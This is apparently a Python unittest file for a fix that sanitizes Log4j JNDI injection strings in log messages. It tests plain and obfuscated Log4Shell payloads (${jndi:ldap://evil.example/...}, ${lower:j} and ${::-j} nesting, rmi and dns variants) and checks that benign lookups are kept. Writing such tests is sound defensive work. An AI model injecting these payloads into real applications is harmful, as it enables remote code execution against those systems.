from __future__ import annotations

import unittest

from fixes.log4j_jndi_injection_fix import (
    BLOCKED_LOOKUP,
    contains_dangerous_lookup,
    sanitize_log_event,
    sanitize_log_message,
    sanitize_many,
)


class Log4jJndiInjectionFixTests(unittest.TestCase):
    def test_direct_jndi_lookup_is_blocked(self) -> None:
        message = "login failed: ${jndi:ldap://evil.example/a}"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, f"login failed: {BLOCKED_LOOKUP}")
        self.assertNotIn("${jndi", sanitized.lower())
        self.assertNotIn("ldap://", sanitized.lower())

    def test_case_mixed_jndi_protocol_is_blocked(self) -> None:
        message = "audit ${JnDi:rMi://evil.example/Object}"

        result = sanitize_log_event(message)

        self.assertTrue(result.changed)
        self.assertEqual(result.blocked_count, 1)
        self.assertEqual(result.sanitized, f"audit {BLOCKED_LOOKUP}")

    def test_nested_lower_lookup_obfuscation_is_blocked(self) -> None:
        message = "payload=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil/a}"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, f"payload={BLOCKED_LOOKUP}")
        self.assertTrue(contains_dangerous_lookup(message))

    def test_colon_dash_obfuscation_is_blocked(self) -> None:
        message = "payload=${${::-j}${::-n}${::-d}${::-i}:dns://evil/a}"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, f"payload={BLOCKED_LOOKUP}")

    def test_dynamic_network_lookup_fails_closed(self) -> None:
        message = "payload=${${env:LOOKUP_KEY}:ldap://evil/a}"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, f"payload={BLOCKED_LOOKUP}")

    def test_benign_lookup_expression_is_preserved(self) -> None:
        message = "service=${env:SERVICE_NAME} status=ok"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, message)
        self.assertFalse(contains_dangerous_lookup(message))

    def test_multiple_dangerous_lookups_are_all_blocked(self) -> None:
        message = "${jndi:ldap://a} and ${jndi:rmi://b}"

        result = sanitize_log_event(message)

        self.assertEqual(result.blocked_count, 2)
        self.assertEqual(result.sanitized, f"{BLOCKED_LOOKUP} and {BLOCKED_LOOKUP}")

    def test_unbalanced_dangerous_lookup_is_blocked(self) -> None:
        message = "broken ${jndi:ldap://evil"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, f"broken {BLOCKED_LOOKUP}")

    def test_log_output_is_single_line(self) -> None:
        message = "first line\n${jndi:ldap://evil}\rnext"

        sanitized = sanitize_log_message(message)

        self.assertEqual(sanitized, f"first line\\n{BLOCKED_LOOKUP}\\rnext")

    def test_batch_sanitizer(self) -> None:
        sanitized = sanitize_many(("ok", "${jndi:ldap://evil}"))

        self.assertEqual(sanitized, ("ok", BLOCKED_LOOKUP))


if __name__ == "__main__":
    unittest.main()
